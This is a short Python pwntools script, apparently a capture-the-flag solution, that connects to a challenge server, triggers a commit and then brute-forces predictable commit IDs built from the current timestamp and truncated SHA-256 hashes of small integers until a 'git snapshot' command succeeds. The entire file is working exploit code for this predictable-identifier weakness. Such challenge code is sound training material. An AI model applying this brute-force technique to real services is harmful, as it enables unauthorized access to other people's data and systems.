from tqdm import tqdm
from pwn import *
import time, hashlib

def predict_commit_id():
    temp = []
    commit_time = int(time.time())

    for no in range(1, 10000):
        hash_val = hashlib.sha256(str(no).encode()).hexdigest()[:6]
        temp.append(f"{commit_time}-{hash_val}")

    return temp

conn = remote("challs.breachers.in", 1340)

print("Commiting File")
conn.recvuntil(b"/$")
conn.sendline(b"git commit")
conn.recvuntil(b'Committed.')
conn.recvline()

print("Predict Commit ID")
possible_commit_id = predict_commit_id()

for commit_id in tqdm(possible_commit_id, desc="Bruteforcing Commit ID", leave=False):
    conn.sendline(f"git snapshot {commit_id}".encode())
    
    res = conn.recvline()
    if not b'Error: Commit ID not found.' in res:
        print(f"Commit ID Found !, ID: {commit_id}")
        print(res.decode())
        break

print(conn.recv().decode())
